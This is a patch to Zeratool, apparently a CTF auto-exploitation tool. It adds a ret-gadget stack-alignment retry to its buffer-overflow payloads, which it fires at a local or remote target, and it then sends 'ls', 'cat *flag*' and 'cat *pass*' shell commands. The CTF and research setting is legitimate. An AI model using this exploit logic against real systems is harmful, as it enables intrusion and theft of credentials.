@@ -1,0 +1,137 @@
+--- a/zeratool/puts_model.py
++++ b/zeratool/puts_model.py
+@@ -42,5 +42,5 @@
+         strlen = angr.SIM_PROCEDURES["libc"]["strlen"]
+         length = self.inline_call(strlen, string).ret_expr
+         out = stdout.write(string, length)
+-        stdout.write_data(self.state.solver.BVV(b"\n"))
++        stdout.write_data(claripy.BVV(b"\n", 8 * len(b"\n")))
+         return out + 1
+--- a/zeratool/simgr_helper.py
++++ b/zeratool/simgr_helper.py
+@@ -428,7 +428,7 @@
+ 
+             # Setup shellcode
+             memory = state.memory.load(address, len(shellcode))
+-            shellcode_bvv = state.solver.BVV(shellcode)
++            shellcode_bvv = claripy.BVV(shellcode, 8 * len(shellcode))
+ 
+             if "leaked_type" in state.globals:
+                 log.info("We have a leak, let's try and use that")
+--- a/zeratool/overflowExploitSender.py
++++ b/zeratool/overflowExploitSender.py
+@@ -1,11 +1,38 @@
+ from pwn import remote, process, u64, u32, ELF, gdb
+ import re
++import subprocess
++from struct import pack
+ from .overflowExploiter import exploitOverflow
+ import logging
+ 
+ log = logging.getLogger(__name__)
+ 
+ 
++def _find_ret_gadget(binary_name):
++    """Find a plain 'ret' (0xc3) instruction address in an executable
++    section, via objdump -d. Used only as a stack-alignment fallback for
++    the point-to-win technique below — see the comment at its call site.
++    Best-effort: returns None on any failure so callers can just skip the
++    retry instead of raising.
++    """
++    try:
++        out = subprocess.run(
++            ["objdump", "-d", binary_name],
++            capture_output=True, text=True, timeout=15,
++        ).stdout
++        for line in out.splitlines():
++            line = line.strip()
++            if line.endswith("ret") and ":" in line:
++                addr_str = line.split(":")[0].strip()
++                try:
++                    return int(addr_str, 16)
++                except ValueError:
++                    continue
++    except Exception:
++        pass
++    return None
++
++
+ def sendExploit(
+     binary_name,
+     properties,
+@@ -139,4 +166,75 @@
+         log.info("[+] Flag found:")
+         log.info(results)
+ 
++    # --- stack-alignment fallback for the plain point-to-win case --------
++    # A ret-based hijack into a function that itself calls something using
++    # SSE instructions (system()/printf() on modern glibc, which use
++    # movaps and require a 16-byte-aligned %rsp) can crash even when the
++    # offset and target address are both exactly correct — angr's symbolic
++    # model can't predict this because that call is a stubbed/hooked
++    # SimProcedure, not real native execution. Real x86-64 practice for
++    # this is a "ret-slide": insert one extra plain `ret` gadget before the
++    # target so the pop it does shifts the stack alignment by 8. Only
++    # tried when the direct attempt didn't already find a flag, and only
++    # for the plain overflow/win-jump path (not leak/dlresolve, which have
++    # a different payload shape entirely).
++    is_plain_overflow = properties["pwn_type"]["results"]["type"] not in (
++        "dlresolve", "leak",
++    )
++    arch = properties.get("protections", {}).get("arch", "amd64")
++    # user_input is angr's full fixed-size symbolic buffer (400 bytes, see
++    # exploitOverflow()'s `claripy.BVS("input", 400 * 8)`), not a tightly
++    # fit payload — the actual win-function address sits wherever the real
++    # overflow offset put it, followed by zero-padding out to 400 bytes.
++    # So the insertion point has to be found by locating the address's own
++    # packed bytes, not assumed to be "the last 8 bytes" of the buffer.
++    win_addr_pos = None
++    if is_plain_overflow and arch == "amd64":
++        for func_info in properties.get("win_functions", {}).values():
++            candidate = pack("<Q", func_info["fcn_addr"])
++            idx = user_input.find(candidate)
++            if idx != -1:
++                win_addr_pos = idx
++                break
++    if (
++        is_plain_overflow
++        and not send_results["flag_found"]
++        and arch == "amd64"
++        and win_addr_pos is not None
++    ):
++        ret_gadget = _find_ret_gadget(binary_name)
++        if ret_gadget is not None:
++            log.info(
++                "[~] No flag from direct point-to-win; retrying with a "
++                "ret-gadget alignment pad (0x{:x}) at offset {} — common "
++                "gotcha when the win function calls system()/printf() on "
++                "modern glibc".format(ret_gadget, win_addr_pos)
++            )
++            alt_input = (
++                user_input[:win_addr_pos]
++                + pack("<Q", ret_gadget)
++                + user_input[win_addr_pos:]
++            )
++            try:
++                if remote_server:
++                    proc2 = remote(remote_url, port_num)
++                else:
++                    proc2 = process(binary_name)
++                proc2.sendline(alt_input)
++                proc2.sendline()
++                proc2.sendline(b"ls;\n")
++                proc2.sendline(b"cat *flag*;\n")
++                proc2.sendline(b"cat *pass*;\n")
++                results2 = proc2.recvall(timeout=3)
++                log.debug(results2)
++                print(results2)
++                if b"{" in results2 and b"}" in results2:
++                    send_results["flag_found"] = True
++                    send_results["alignment_retry"] = True
++                    results = results2
++                    log.info("[+] Flag found after alignment retry:")
++                    log.info(results2)
++            except Exception as e:
++                log.info("[~] Alignment retry failed to even run: {}".format(e))
++
+     return send_results
